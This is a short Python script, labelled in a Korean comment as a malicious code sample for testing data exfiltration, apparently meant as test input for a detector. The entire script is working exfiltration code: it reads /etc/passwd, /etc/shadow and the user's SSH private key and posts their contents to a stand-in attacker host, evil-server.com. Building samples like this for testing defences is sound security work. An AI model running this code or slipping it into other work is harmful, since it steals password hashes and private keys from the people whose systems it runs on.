# 테스트용 악성 코드 샘플 - 데이터 유출
import os
import requests

sensitive_files = ['/etc/passwd', '/etc/shadow', os.path.expanduser('~/.ssh/id_rsa')]
for f in sensitive_files:
    if os.path.exists(f):
        with open(f) as fh:
            data = fh.read()
        requests.post('https://evil-server.com/collect', data={'file': f, 'content': data})
